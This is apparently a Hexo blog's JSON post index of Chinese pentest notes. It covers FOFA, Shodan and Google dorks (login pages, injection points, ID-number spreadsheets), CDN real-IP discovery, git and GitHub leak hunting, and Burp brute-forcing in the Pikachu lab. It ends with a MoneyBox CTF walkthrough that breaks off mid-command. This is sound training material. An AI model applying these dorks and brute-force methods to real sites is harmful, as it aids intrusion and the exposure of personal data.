{"meta":{"title":"Error","subtitle":"","description":"","author":"Zhou muyun","url":"http://zhoumuyun.com","root":"/"},"pages":[{"title":"标签","date":"2023-12-02T11:55:30.000Z","updated":"2023-12-02T11:58:17.602Z","comments":true,"path":"tags/index.html","permalink":"http://zhoumuyun.com/tags/index.html","excerpt":"","text":""},{"title":"分类","date":"2023-12-02T12:00:16.000Z","updated":"2023-12-02T12:01:33.092Z","comments":true,"path":"categories/index.html","permalink":"http://zhoumuyun.com/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"信息收集之搜索引擎","slug":"信息收集之搜索引擎","date":"2024-01-08T07:49:56.000Z","updated":"2024-01-08T07:52:24.493Z","comments":true,"path":"2024/01/08/信息收集之搜索引擎/","link":"","permalink":"http://zhoumuyun.com/2024/01/08/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8B%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/","excerpt":"此篇介绍了搜索引擎的用法，FOFA、Google、shodan","text":"此篇介绍了搜索引擎的用法，FOFA、Google、shodan FOFA搜索引擎简介FOFA是白帽汇推出的一款网络空间搜索引擎，它通过进行网络空间测绘，能够帮助研究人员或者企业迅速进行网络资产匹配，例如进行漏洞影响范围分析、应用分布统计、应用流行排名统计等 例子title&#x3D;”beijing” 从标题中搜索“北京” header&#x3D;”elastic” 从http头中搜索“elastic” body&#x3D;”网络空间测绘” 从html正文中搜索“网络空间测绘” domain&#x3D;”qq.com” 搜索根域名带有qq.com的网站。 icon_hash&#x3D;”-247388890” 搜索使用此icon的资产。 仅限FOFA高级会员使用 host&#x3D;”.gov.cn” 从url中搜索”.gov.cn” 搜索要用host作为名称 port&#x3D;”6379” 查找对应“6379”端口的资产 icp&#x3D;”京ICP证030173号” 查找备案号为“京ICP证030173号”的网站 搜索网站类型资产 ip&#x3D;”1.1.1.1” 从ip中搜索包含“1.1.1.1”的网站 搜索要用ip作为名称 ip&#x3D;”220.181.111.1&#x2F;24” 查询IP为“220.181.111.1”的C网段资产 status_code&#x3D;”402” 查询服务器状态为“402”的资产 protocol&#x3D;”quic” 查询quic协议资产 搜索指定协议类型(在开启端口扫描的情况下有效) country&#x3D;”CN” 搜索指定国家(编码)的资产。 region&#x3D;”HeNan” 搜索指定行政区的资产。 city&#x3D;”HanDan” 搜索指定城市的资产。 cert&#x3D;”baidu” 搜索证书(https或者imaps等)中带有baidu的资产。 cert.subject&#x3D;”Oracle Corporation” 搜索证书持有者是Oracle Corporation的资产 cert.issuer&#x3D;”DigiCert” 搜索证书颁发者为DigiCert Inc的资产 cert.is_valid&#x3D;true 验证证书是否有效，true有效，false无效，仅限FOFA高级会员使用 banner&#x3D;users &amp;&amp; protocol&#x3D;ftp 搜索FTP协议中带有users文本的资产。 type&#x3D;service 搜索所有协议资产，支持subdomain和service两种。 os&#x3D;”centos” 搜索操作系统为CentOS资产。 server&#x3D;&#x3D;”Microsoft-IIS&#x2F;10” 搜索IIS 10服务器。 app&#x3D;”Microsoft-Exchange” 搜索Microsoft-Exchange设备 after&#x3D;”2017” &amp;&amp; before&#x3D;”2017-10-01” 时间范围段搜索 asn&#x3D;”19551” 搜索指定asn的资产。 org&#x3D;”Amazon.com, Inc.” 搜索指定org(组织)的资产。 base_protocol&#x3D;”udp” 搜索指定udp协议的资产。 is_fraud&#x3D;false 排除仿冒&#x2F;欺诈数据 is_honeypot&#x3D;false 排除蜜罐数据，仅限FOFA高级会员使用 is_ipv6&#x3D;true 搜索ipv6的资产,只接受true和false。 is_domain&#x3D;true 搜索域名的资产,只接受true和false。 port_size&#x3D;”6” 查询开放端口数量等于”6”的资产，仅限FOFA会员使用 port_size_gt&#x3D;”6” 查询开放端口数量大于”6”的资产，仅限FOFA会员使用 port_size_lt&#x3D;”12” 查询开放端口数量小于”12”的资产，仅限FOFA会员使用 ip_ports&#x3D;”80,161” 搜索同时开放80和161端口的ip资产(以ip为单位的资产数据) ip_country&#x3D;”CN” 搜索中国的ip资产(以ip为单位的资产数据)。 ip_region&#x3D;”Zhejiang” 搜索指定行政区的ip资产(以ip为单位的资产数据)。 ip_city&#x3D;”Hangzhou” 搜索指定城市的ip资产(以ip为单位的资产数据)。 ip_after&#x3D;”2021-03-18” 搜索2021-03-18以后的ip资产(以ip为单位的资产数据)。 ip_before&#x3D;”2019-09-09” 搜索2019-09-09以前的ip资产(以ip为单位的资产数据)。 Shodon搜索引擎介绍目前热门都认为谷歌是最强劲的搜索引擎，但Shodan 才是互联网上最可怕的搜索引擎。与谷歌不同的是， Shodan 不是在网上搜索网址，而是直接进入互联网的背后的通道。 Shodan 可以说是一款“黑暗”谷歌，一刻不停的在 寻找着所有和互联网关联的服务器、摄像头、打印机、路由器等等。还可以直接显示出目标的具体地理位置信息。 技巧方法1:通过Shodan搜索Webcam网络摄像头设备在搜索框中输入 “webcam” 进行搜索。 方法2：Shodan搜索指定端口 在搜索框中输入port：端口号，就可以搜索指定端口我们可以尝试一些常用端口来进行搜索 比如我们要搜索 80端口，就可以得到开放80端口的服务器。 也可以尝试搜索下其他常用的端口， 例如：21，22，23，25，80，443，3306，3389 等 常见端口： 21 号端口：文件传输协议 - 控制端口 22 号端口：SSH（Secure Shell）- 远程登录协议 23 号端口****：Telnet 终端仿真协议 - 未加密文本通信 25 号端口：SMTP（简单邮件传输协议） 80 号端口：超文本传输协议 - 用于传输网页 443 号端口：超文本传输安全协议 - 超文本传输协议 over TLS&#x2F;SSL（加密传输） 445 号端口：SMB 文件共享 3306 号端口：MySQL 数据库系统 3389 号端口：远程桌面协议（RDP） 常见的过滤命令 hostname：搜索指定的主机或域名，例如hostname:”google” port：搜索指定的端口或服务，例如port:”21” country：搜索指定的国家，例如country:”CN” city：搜索指定的城市，例如city:”Hefei” org：搜索指定的组织或公司，例如org:”google”** isp：搜索指定的ISP供应商，例如isp:”China Telecom”** product：搜索指定的操作系统&#x2F;软件&#x2F;平台，例如product:”Apache httpd”** version：搜索指定的软件版本，例如version:”1.6.2”** geo：搜索指定的地理位置，例如geo:”31.8639,117.2808”** before&#x2F;after：搜索指定收录时间前后的数据，格式为 dd-mm-yy，例如before:”11-11-15” net：搜索指定的 IP地址或子网，例如net:”210.45.240.0&#x2F;24” Google搜索引擎基本关键字 算 符 含 义 应用举例 AND&#x2F;空格 所连接的关键词之间是“与”的关系; 云计算 分布式计算 OR&#x2F;| 所连接的关键词之间是“或”的关系 图片 | 写真 - 所连接的关键词之间是“非”的关系 神雕侠侣 -游戏 （） 在检索式中括号里的运算将优先进行 电子商务 AND (云计算 -分布式计算) “” “”英文双引号中的内容作为一个整体被搜索; 精确匹配搜索 “智能天线” * 通配符-星号*，代表完整的字词; A * B、A * * B这两个是有区别的 Flower * pots &#x2F;Flower * * pots + 强制搜索一般会被自动忽略的搜索关键词，如：who、the、of、am +B ~ 同义符;在搜索词前使用，表示会和同时搜索相近词义的词;示例中会同搜元素Si ~ silicon .. 搜索数字范围限定 手机价格2000..5000 filetype: 把搜索范围限定在特定文件类型中; .pdf&#x2F;.doc&#x2F;.docx&#x2F;.ppt&#x2F;.pptx&#x2F;.xls&#x2F;.xlsx&#x2F;.rtf&#x2F;.txt&#x2F;.swf&#x2F;.ps 霍金 黑洞filetype:pdf site： 把搜索范围限定在特定站点、某一站点特定频道、特定域名后缀中 科技 site:news.163.com inurl: 把搜索范围限定在url链接中 inurl:jiqiao photoshop allinurl: 把搜索范围限定在url链接中, 只不过其后所有关键词均要在url链接中出现 allinurl:jiqiao photoshop intitle 把搜索范围限定在网页标题中 商业 intitle:超级女声 allintitle: 把搜索范围限定在网页标题中; 只不过其后所有关键词均要在网页标题中出现 allintitle:超级女声 张靓颖 intext: 把搜索范围限定在网页正文中; 忽略超链接文本、URL以及题目等 inanchor: 把搜索范围限定在链接锚文本文字中 inanchor:吴清源 anchor: 检索某一作者&#x2F;发明人的论著; 只在Google Scholar中可用 anchor:&#x2F;作者: link： 检索所有链接到某个特定URL网址的网页;只能单独使用 link:163.com cache: Google网页快照 related： 检索与某特定网页类似的网页 related:www.163.com/index.shtml info: 用来显示与某链接相关的一系列搜索; 提供cache、similar-pages、link、related等连接 info:www.sina.com.cn Index of 可以帮助你寻找网络和FTP目录 index of mp3 daterange: 查找在一定的日期或者一定的日期范围内; 只关注被Google收录的时间 location: 指定地区区域内查询关键词相关的网页 wow gold location:France weather: 查询该地区或城市当前的天气状况 weather:北京 stocks: 查询股票信息; 一般源于专业财经网站 stocks:比亚迪 define: 返回包含查询关键词定义的网面 define: 暗网 注意:关键词与命令之间有一个空格;在这些关键字中;请勿在冒号后面接空格;命令需用英文输入,包括冒号。AND、OR、NOT均应大写,而其他算符必须是小写，虽其对检索词完全不区分大小写 介绍 Google 是当今世界上最强大的搜索引擎，也是黑客手中的一个秘密武器。 GoogleHack 就是利用Google 搜索引擎来辅助进行渗透测试的。 Google 在 SecTools 排行榜上排名第 26 位。 Google 直接搜索自己想要的内容，正常情况下我们都是直接用语言进行描述问题来进行搜索，然后搜索引擎也有特定的语法可以使用，熟练掌握搜索引擎的语法可以让你的搜索效率和准确率大幅度提升， 当然我们学习这种技巧是为了寻找存在漏洞的页面，或者存在敏感信息的文件 常见的Google关键字 site：指定域名 inurl：URL中存在的关键字页面 intext：网页内容里面的关键字 Filetype：指定文件类型 intitle：网页标题中的关键字 link：返回你所有的指定域名链接 info：查找指定站点信息 cache：搜索 Google 里的内容缓存 -关键字：不希望搜索结果中出现包含该关键字的网页 技巧技巧1：搜注入点inurl:搜索URL中包含指定关键字的网页 输入内容：inurl:php?id&#x3D;或者inurl:asp?id&#x3D; 技巧2：搜后台登录界面什么的inurl:login|admin|manage|manager|admin_login|login_admin|system|boss|master 技巧3：搜索敏感信息intitle:搜索标题种种函数关键字的网页 intitle:管理|登录|后台；搜索标题含有“管理”、“登录”、“后台”的网页 filetype:xls 身份证 搜索含有身份证的xls文件 技巧4：搜索敏感页面site:xxx.com inurl:file site:xxx.com inurl:load 技巧5：搜索重要文件例如：robots.txt告知搜索引擎，网站中那些目录不希望被蜘蛛爬到 site:xxx.com inull:robots.txt site:xxx.com inurl:txt 技巧6：**”kali filetype:torrent”**kali是我们要搜索的关键字 filetype指点文件类型 torrent文件类型名称，torrent是种子文件，可以填写任意扩展名 site:xxx.com filetype:mdb site:xxx.com filetype:ini 技巧7：**”intext:user.sql intitle:index.of” 组合使用技巧**intext:user.sql查询包含 user.sql 用户数据库信息的页面 intitle:index.of表示网站目录是开放状态 技巧8：查看同类网站related:将返回相似的页面，相似指的是网页的布局相似； www.sxu.edu.cn www.llhc.edu.cn 技巧9：查看服务器使用的程序site:xxx.com filetype:asp site:xxx.com filetype:php site:xxx.com filetype:jsp site:xxx.com filetype:aspx 判断网站用了说明编程语言","categories":[{"name":"渗透笔记","slug":"渗透笔记","permalink":"http://zhoumuyun.com/categories/%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"信息收集","slug":"信息收集","permalink":"http://zhoumuyun.com/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"}]},{"title":"信息收集","slug":"信息收集","date":"2024-01-07T13:49:53.000Z","updated":"2024-01-08T09:16:03.522Z","comments":true,"path":"2024/01/07/信息收集/","link":"","permalink":"http://zhoumuyun.com/2024/01/07/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/","excerpt":"此篇介绍了信息收集的基本操作，资产架构、番外安全、收集阻碍、内网web服务器。信息打点，弄清楚web架构，源码的类型、有没有泄露源码、查找域名。查找资产泄露。cdn绕过寻找真实ip,","text":"此篇介绍了信息收集的基本操作，资产架构、番外安全、收集阻碍、内网web服务器。信息打点，弄清楚web架构，源码的类型、有没有泄露源码、查找域名。查找资产泄露。cdn绕过寻找真实ip, 信息收集基本信息资产架构web单个源码指向安全只有一个目录，没有其他的目录 web多个目录源码安全bbs.example.com dz论坛 bbs.example.com&#x2F;bolg wp程序 一个网站两个程序 任何一个程序出现漏洞都可以安全测试 web多个端口源码安全bbs.example.com dz论坛 bbs.example.com :8080 zblog程序 服务器架设多个站点安全bbs.example.com 47.242.117.23 bbs.example.com 47.242.117.23 给到你的目标bbs.example.com 尝试对服务下edu.example.com 进行安全测试 架设第三方插件接口安全WordPress插件file-maneager漏洞复现 web源码插件 web应用插件：phpadmin插件，便于数据管理的 方便了管理人员管理数据库 直接访问地址就能直接访问 也方便了攻击者进行攻击数据库的方式。有些数据库，限制了ip,只允许本机登录。当时phpadmin就可以在其他ip登录。 服务器架设多个应用安全服务器应用ftp,方便管理人员进行文件操作，也方便了攻击者进行哦攻击ftp协议服务 安装的越多，攻击者的目标越多 番外安全属于社会工程学的类别 基于域名解析安全大部分网站都有域名，域名和服务器购买的地方有可能不在一个地方。 如果知道购买的厂商，可以尝试去在厂商破解，在社会工程学上可以去查询 猜测密码或者找回密码，可以修改域名 基于服务器本身安全都是属于是本身的问题 基于服务商信息安全基于管理个人的安全点对点的攻击，就是搞个人 考虑阻碍阻碍-站库分离源码和数据库不在一个IP地址，网站会调用远程的数据库 导致攻击的时候，获取的东西得不到 阻碍-CDN加速服务cdn节点，属于科学上网的方式 网站会调用最近的节点，是一种缓存，解决网络通讯的速度稳定 在网络上看到的是缓存，攻击的也是缓存，要找到真实IP 阻碍-负载均衡服务备用机，多台服务器，预防服务器奔溃 如果攻击备用机，拿到的也是备用机。最好的情况是拿到主机，主服务。 阻碍-WAF应用防火墙网站应用防火墙 ，IIS网站防火墙，Nginx网站防火墙，Apache网站防火墙 防止漏洞攻击，安装之后有些攻击就会被阻止掉 阻碍-主机防护防火墙杀毒软件 不会直接拦截网站上的攻击，假如网站入侵成功了，而且拿到了权限，但是下一步要拿服务器的权限，服务器的防护软件就会组织。 就是绕过这些东西，需要一些条件，也不是都能过绕过 内网web服务器从您的描述中，可以理解您在进行内网安全测试。以下是针对内网服务器原理和您描述的情况的解释： 内网服务器原理 内网服务器：通常在局域网中运行，使用私有IP地址（例如，192.168.x.x，10.x.x.x等）。这些服务器通过路由器或防火墙连接到公共互联网。 外网映射反向代理：可以通过配置防火墙或路由器来实现外部请求的转发或反向代理。这将公共IP地址与内部服务器关联，允许外部访问内部服务器。 安全测试需求：您可能要在内部网络中进行安全测试，以模拟外部攻击。您希望从外部扫描和测试内网服务器，以检测可能存在的安全漏洞。 用于安全测试的方法 扫描探针信息：使用扫描工具（如端口扫描器）对内网IP范围进行探测，寻找可访问的服务和漏洞。 目标与网段：目标是在网段 171.40.78.1-255 中发现内网中的服务。已经发现了内网中的一个主机（171.40.78.99）。 内网攻击安全测试手段：对于类似学校或企业内部网络，出口IP与内部服务器的真实IP不同。这可能导致扫描到的地址（171.40.78.83）与实际内部服务器地址不匹配。 注意事项 内网地址映射：由于内网服务器被映射到公共IP，扫描结果可能显示出不准确或误报。真实服务器地址可能不可见。 内部网络安全限制：学校或企业内部网络可能设置了防火墙、入侵检测系统等安全措施，可能会阻止或限制对内部服务器的扫描和测试。 反向代理192.168.1.100内网多个代理 202.103.25.102 内网主机的外网出口 能够解析202.103.25.102 但是解析不到192.168.1.100 外网主机 101.3.13.45 192.168.1.100 将web请求解析到101.3.13.45 DNS域名101.3.13.45 信息打点web架构-语言&amp;中间件&amp;数据库&amp;系统等 Web架构：包括语言、中间件、数据库和操作系统。 操作系统：Windows和Linux的判断与识别。 开发语言：ASP&#x2F;ASPX、PHP、Java、Python、JavaScript等。 程序源码：CMS、框架等源码类型。 中间件容器：IIS、Apache、Nginx、Tomcat、Weblogic、Jboss等。 数据库：MySQL、MSSQL、Oracle、Access、DB2、Sybase、Redis、MongoDB等。 第三方软件：phpMyAdmin、vs-ftpd、VNC、ELK、OpenSSH等。 漏洞：SQL注入、文件安全、RCE执行、XSS跨站、CSRF&#x2F;SSRF&#x2F;CRLF、反序列化、逻辑越权、未授权访问、XXE&#x2F;XML、弱口令安全等。 收集信息后的判断通过网站的连接打开检查源代码，network抓包，去检查类似的文件 在Response Header中可以看到: x-powered-by,server,product，都可以去检查看看 判断语言：通过源代码、Header信息、连接和抓包等方式。 判断操作系统：根据ID参数、后缀修改、TTL值、ping命令等方式。 这个id属于参数 改成这样，如果页面没有变化，就是Windows系统，Windows大小写不冲突 一般在后缀上面改，改完之后，Windows应该不会改变 ping 后面的ttl值也可以判断 linux系统的ttl值是64或者为55 Windows NT&#x2F;2000&#x2F;XP系统的TTL值为128 windows 98系统的TTL值为32 Unix主机的TTL值为255 一般来说，离那个值越近就是哪个系统 判断数据库与中间件：扫描端口、搭建组合、组合扫描、网上搜寻等方法。 搭建组合或者端口扫面 可以去网上搜，比如：PHP与上面数据库最搭配，网上一般有最优答案 access mysql3306 mssql1433 redis6379 mongodb27017 oracle1521 postreqsl 开启服务会开启一个端口 可以用端口扫描，扫描数据库开启端口 Web源码类型的获取与特征 CMS开源：公开的源码，可通过网上搜索获得。 闭源售卖：源码被加密，作为内部工具出售。 自主研发：个人或公司自行研发的源码，难以获取。 Web源码获取、泄露与监控 安全测试：利用公开的漏洞库进行安全测试。 白盒代码审计：对源码进行审计，寻找漏洞。 MySQL漏洞和弱口令：利用漏洞或弱密码获取源码信息。 Web域名的分析 子域名、相似域名与反查域名：变动资源名、域名后缀等分析方法。 www.jmlsd.com www.jmlsd.cn 资源名变www 变动jmlsd jmlsd 123 8 变动com net cn org 信息点和技术点 信息点：系统信息、应用信息、防护信息、人员信息、其他信息等收集点。 技术点：CMS技术、端口扫描、CDN绕过、源码获取、子域名查询、WAF识别、负载均衡识别等技术手段。 资产泄露根据您提供的信息，您想要获取CMS识别信息，并提到了一些安全问题和泄露情况。这里是一些建议和步骤来优化和解决这些问题： CMS识别 访问云悉指纹识别平台以获取CMS识别信息。 如果您已经有账户，直接登录并使用平台的服务来识别CMS。 如果您没有账户，您可能需要注册一个账户才能使用服务。 备份文件泄露 不要在Web根目录下存放备份文件，如www.rar或www.zip。这使得备份文件可能通过子域名直接访问和下载。 \\wwwroot\\www.xiaodi8.com 备份 c:\\wwwroot\\www.xiaodi8.com\\www.rar www.zip 等 别人可以直接从子域名后面进入下载 c:\\wwwroot\\ c:\\wwwroot\\www.rar 在这里备份的话只能从ip地址访问 应该将备份文件存储在非公开访问的目录中，并确保通过安全的文件传输协议传输这些文件。 GIT泄露git init 在初始化目录的时候，会在当前目录自动创建一个.git目录，用来记录代码的变更记录，发布代码的时候如果没有把git给删除，就直接发布在服务器上面，攻击者就是可以通过他来恢复源码 在部署到生产环境之前，确保删除.git目录以避免源代码泄露。 可以使用GitHack工具来检测和修复GIT泄露问题，使用方法如下： github项目地址：https://github.com/lijielijie/GubHack 1GitHack.py http://www.example.com/.git/ SVN泄露 类似于GIT泄露，确保在生产环境中不公开.svn目录。 和上面的案例差不多，都可以通过Git Hack直接下载 DS_store泄露: 对于使用Mac系统的开发人员，不要在服务器上保留.DS_Store文件，这可能泄露文件结构信息。 composer.json泄露: 对于使用Composer的PHP项目，确保composer.json不在公开可访问的目录中。 WEB-INF泄露: 确保Java Web应用的WEB-INF目录不可直接通过Web访问。 GitHub泄露监控: 定期监控GitHub仓库，以检测是否错误地公开了敏感信息。 使用GitHub的搜索功能或专门的工具来检测泄露。 GITHUB 资源搜索：in:name test #仓库标题搜索含有关键字in:descripton test #仓库描述搜索含有关键字in:readme test #Readme 文件搜素含有关键字stars:&gt;3000 test #stars 数量大于 3000 的搜索关键字stars:1000…3000 test #stars 数量大于 1000 小于 3000 的搜索关键字 forks:&gt;1000 test forks 数量大于 1000 的搜索关键字forks:1000…3000 test #forks 数量大于 1000 小于 3000 的搜索关键字 size:&gt;&#x3D;5000 test#指定仓库大于 5000k(5M)的搜索关键字 pushed:&gt;2019-02-12 test #发布时间大于 2019-02-12 的搜索关键字 created:&gt;2019-02-12 test #创建时间大于 2019-02-12 的搜索关键字 user:test#用户名搜素license:apache-2.0 test #明确仓库的 LICENSE 搜索关键字 language:java test #在 java 语言的代码中搜索关键字user:test in:name test #组合搜索,用户名 test 的标题含有 test 的 关键字配合谷歌搜索：site:Github.com smtpsite:Github.com smtp @qq.comsite:Github.com smtp @126.comsite:Github.com smtp @163.comsite:Github.com smtp @sina.com.cnsite:Github.com smtp passwordsite:Github.com String password smtp CDN绕过CDN工作原理： 传统访问：用户请求域名，解析至真实服务器IP，访问目标主机。 普通CDN：用户请求域名，经过CDN节点访问真实服务器IP，再访问目标主机。 CDN（带WAF）：包含Web应用防火墙的CDN，同样会经过CDN节点访问真实服务器IP，再访问目标主机。 CDN配置：加速域名：单个或多个域名进行CDN加速。1，有些网站只加速主域名，可以去找他的子域名 只加速www.yansiqi.com 那么下面的test.yansiqi.com就没有加速，可以找test.yansiqi.com的真实ip 一般子域名极有可能和主站保持同一个IP *.yansiqi.com 所有子域名都加速 2，加速区域：指定需要加速的地区。 有些厂商只加速常用的区域，一些偏远地区没有加载 比如在中国的厂商，有些只加速了亚洲 可以从非洲、东南亚等一下偏远地区平 3，加速类型：确定需要加速的资源。 有些厂商只加速一些资源 判定是否有CDN1，NslookupWin下使用nslookup命令进行查询，若返回域名解析结果为多个ip，多半使用了CDN，是不真实的ip。 2,多地ping查询使用不同区域ping，查看ping的ip结果是否唯一。若不唯一，则目标网站可能存在CDN。 网站有： 123https://asm.ca.com/en/ping.php/http://ping.chinaz.com/https://ping.aizhan.com/ 3，使用工具直接查询网站： 12http://www.cdnplanet.com/tools/cdnfinder/https://www.ipip.net/ip.html 获取真实IP的方法：1，利用网站漏洞如phpinfo敏感信息泄露，Apache status 和boss status敏感信息泄露，网页源代码泄露，svn信息泄露，github信息泄露 若存在web漏洞，服务器主动与我们发起请求连接，我们也能获取目标站点的真实ip,列入xss,命令行执行反弹shell 2，历史DNS记录查询查询ip和域名绑定历史记录，可能会发现使用CDN之前的目标IP 查询网站有 微步在线;https://x.threatbook.com/ viewdn：https://viewdns.info/ 17ce：www.17ce.com 微软：https://ti.defender.microsoft.com/ www.crimeflare.com 3，国外请求通过国外的一些冷门的DNS或者IP去请求目标，很多时候国内的CDN对国外的覆盖面并不是很广，可以利用此特点进行检测，通过国外代理访问就可以查看真实的ip地址，或者说，通过国外的DNS解析，可能就能得到真实的IP 查询网站： asm.ca.com&#x2F;en&#x2F;ping.php 4，扫描探测过信息收集，缩小扫面范围，确定一个相对小的ip 和端口范围（中国？AS号？B段？等） 通过http指纹特征和keyword等做综合判断，可以用下面的工具 github.com&#x2F;zmp&#x2F;zgrab&#x2F; www.ipdeny.com/ipblock 案例漏洞&amp;遗留文件ping或者请求网站 主动请求的，所以是CDN节点 (类似正向shell) 目标服务器去请求你设置的资源 ，所以是真实ip (类似反向shell) srf漏洞：可以通过请求来获取真实的IP，在目标主机访问主机 47.94.236.117（服务器）开设了web服务，记录日志 www.ansiqi.com srf漏洞会接受用户的数据并利用服务器去请求 漏洞请求47.94.236.117 日志就会记录访问的ip,访问的服务器IP 子域名查询操作www.sp910.com 假如设置的加速域名是：www.sp910.com 我们可以去访问其他域名：sp910.com 主动邮件配合备案和srf漏洞有原理差不多 很多站点的邮件系统都是在内部的，没有通过cdn的解析，可在邮件源码里卖弄就会包含服务器的真实ip www.mozhe.cn 忘记密码，发送邮寄到自己的邮箱 打开邮件显示内容原文，received里面有ip 当邮件和接口查询ip不一致，看备案信息，备案信息有真实ip所在地，根据地址确定真实ip 全网扫描fuckCDN有fuckcdn，和zmap HOSTS绑定指向访问当你扫描到ip地址后，windows可以在host文件里面，linux在&#x2F;etc&#x2F;hosts里面修改文件，解析真实的ip地址，后期测试流量会直接进入真实IP，就不会是cdn节点","categories":[{"name":"渗透笔记","slug":"渗透笔记","permalink":"http://zhoumuyun.com/categories/%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"信息收集","slug":"信息收集","permalink":"http://zhoumuyun.com/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"}]},{"title":"burp工具调整","slug":"burp工具调整","date":"2024-01-07T12:11:23.000Z","updated":"2024-01-07T12:19:31.863Z","comments":true,"path":"2024/01/07/burp工具调整/","link":"","permalink":"http://zhoumuyun.com/2024/01/07/burp%E5%B7%A5%E5%85%B7%E8%B0%83%E6%95%B4/","excerpt":"burpsuite的调教","text":"burpsuite的调教 解决burpsuite光标偏移 burp捕捉google浏览器的包 去商店下载插件switch Omega 配置本地地址和burp的端口 抓需要国外代理的包要想能够连到国外网络，就是还要设置一层代理 设置3个东西 *代表全部网站都走这个代理，可以自己约束更改 127.0.0.1 代表本地的代理地址 7890 代表本地代理开放的端口 就可以抓到国外的包了","categories":[{"name":"渗透笔记","slug":"渗透笔记","permalink":"http://zhoumuyun.com/categories/%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"工具介绍","slug":"工具介绍","permalink":"http://zhoumuyun.com/tags/%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8D/"}]},{"title":"pikachu","slug":"pikachu","date":"2024-01-07T12:02:40.000Z","updated":"2024-01-07T12:03:06.827Z","comments":true,"path":"2024/01/07/pikachu/","link":"","permalink":"http://zhoumuyun.com/2024/01/07/pikachu/","excerpt":"此篇介绍了pikachu靶场","text":"此篇介绍了pikachu靶场 表单暴力破解 在burp上找到登录的包 利用intruder进行爆破 出现两组密码 admin 123456 pikachu 000000 基于服务端的验证码绕过 将登录的包拦截 添加两个payload位置进行爆破 成功爆破为admin 123456 将账号密码admin 123456提交 基于客服端的验证码绕过 token绕过抓登录的包 爆破出密码为password token爆破进行post爆破找不到密码 基本上token不对，密码验证马上就会pass掉，要换一种爆破方式，将token的值加入被爆破的行列 由于爆破的项目增加了一个，所以在intruder中采用”pitchfork”模式爆破 使用pithfork类型 token爆破和其他的爆破还不太一样，需要将上一个返回包的token拿下来，放到现在请求包里面 token的payload改成递归提取 首次请求初始payload设置成第一个包 将线程改成1，不能并发，因为需要前一个相应包的token 在这里进行正则匹配，匹配上一个相应包的token 匹配上一个响应包的正则 将重定向改成总是 得到正则表达式 现在就有token数据了","categories":[{"name":"渗透笔记","slug":"渗透笔记","permalink":"http://zhoumuyun.com/categories/%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"打靶机","slug":"打靶机","permalink":"http://zhoumuyun.com/tags/%E6%89%93%E9%9D%B6%E6%9C%BA/"}]},{"title":"moneybox","slug":"moneybox","date":"2024-01-07T11:38:32.000Z","updated":"2024-01-07T12:29:29.980Z","comments":true,"path":"2024/01/07/moneybox/","link":"","permalink":"http://zhoumuyun.com/2024/01/07/moneybox/","excerpt":"money box的思路","text":"money box的思路 使用oracle虚拟机 看本地ip地址，看有没有连上靶机arp-scan -larp-scan: 这是执行arp-scan工具的命令，用于通过ARP请求发现本地网络上的设备。 -l: 这个参数指定了将扫描本地网络段的所有IP地址。 arp-scan -l 命令用于扫描本地网络中的所有设备，并显示它们的 IP 地址、MAC 地址和制造商信息。 扫端口nmap -p- 192.168.56.102 nmap：这是执行网络映射工具 Nmap 的命令。 -p-：这个参数告诉Nmap扫描所有65535个TCP端口。基本上，-p 选项用于指定扫描的端口，- 表示扫描从1到65535的所有端口，即完整的端口范围。 192.168.56.102：这是要扫描的目标主机的IP地址。 所以，这个命令的整体作用是对192.168.0.129这个IP地址上的目标设备执行全端口扫描，以发现哪些TCP端口是开放的、哪些是关闭的以及哪些是被过滤的。这可以帮助了解目标机可能运行的服务或者应用，并且有助于安全评估和漏洞查找。 带默认脚本进行扫描，获取更多信息nmap -p 21,22,80 -sC 192.168.0.129 命令介绍 nmap: 这是执行Nmap网络扫描工具的命令。 -p 21,22,80: 这个参数指定了要扫描的端口列表。这里指定扫描端口21（通常用于FTP服务）、22（通常用于SSH服务）和80（通常用于HTTP服务）。 -sC: 这个参数等同于 –script&#x3D;default，表示启用默认的Nmap脚本引擎（NSE）脚本。NSE用于在扫描过程中执行各种有用的相应任务，例如额外的服务信息收集，检测某些漏洞等。 192.168.56.102: 这是要扫描的目标主机的IP地址。 收集到了每个端口的信息 发现ftp登录的漏洞发现ftp拥有允许匿名ftp登录的漏洞，Anonymous:Anonymous登录 下载文件 登录上ftp,用Anonymous登录 得到照片下载文件，得到一张照片，从图片看不到什么信息 用二进制打开图片看看strings trytofind.jpgStrings 命令：在类Unix操作系统中，strings 是一个在二进制文件中查找可打印字符序列的工具。它常常用于从二进制执行文件中提取文本字符串，这有助于理解文件内容，尤其在没有源代码的情况下 打开发现正常图片不应是这种格式 正常图片 解析照片steghide info trytofind.jpgSteghide是一个隐写软件，用于在图像或声音文件中嵌入或提取隐秘数据。提到steghide info trytofind.jpg时，这条命令是在用Steghide软件检查名为trytofind.jpg的JPEG图像文件中是否包含隐秘嵌入的数据。 sudo apt-get install steghide 去获取密钥这里需要一个密钥，但是现在没有信息，去其他的端口看看 检查其他端口检查80端口 没什么东西，扫一下看一下有什么其他目录吧 检查目录dirsearch -u http://192.168.56.102 -x 403,404,401检查出有一个bolgs文件，可以打开看看 检查目录文件发现有一个文件， 查看页面源代码获取到在下面看到有一串文字 翻译得到另外一个目录 打开目录后看到页面 查看源代码 发现类似密钥看到下面有一层数字，可以拿过来试试图片密钥 进行解密steghide extract -sf trytofind.jpg提取图片的数据，生成了一个data.txt文件 打开data.txt文件看看 这里的英文意思是你的密码太短了，需要更改你的密码，可以猜测这里的密码是弱口令，可以进行爆破 弱口令爆破这里用字典进行爆破，拷贝字典到当前目录，将名字追加到user.txt cp &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt.gz . gunzip rockyou.txt.gz &#x2F;&#x2F;这是个超大的密码字典 echo renu &gt; user.txt 打开txt文件 这是renu用户，看看有什么其他用户 收集信息查看历史记录，看一下有什么信息 命令解释chmod 400 id_rsa ssh-i id_rsa 